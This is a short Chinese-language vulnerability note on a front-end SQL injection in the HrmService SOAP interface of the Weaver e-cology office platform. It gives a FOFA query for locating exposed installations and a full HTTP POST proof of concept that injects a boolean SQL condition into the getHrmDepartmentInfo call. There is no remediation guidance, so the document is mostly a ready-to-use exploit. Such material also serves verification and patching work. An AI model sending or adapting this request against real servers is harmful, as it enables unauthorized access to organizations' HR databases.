# 泛微e-cology接口HrmService前台SQL注入漏洞

泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology系统HrmService前台存在SQL注入漏洞。

## fofa

```java
app="泛微-协同商务系统"
```

## poc

```yaml
POST /services/HrmService HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: close
SOAPAction: urn:weaver.hrm.webservice.HrmService.getHrmDepartmentInfo
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 427

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrm="http://localhost/services/HrmService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrm:getHrmDepartmentInfo>
         <!--type: string-->
         <hrm:in0>gero et</hrm:in0>
         <!--type: string-->
         <hrm:in1>1)AND(db_name()like'ec%'</hrm:in1>
      </hrm:getHrmDepartmentInfo>
   </soapenv:Body>
</soapenv:Envelope>
```

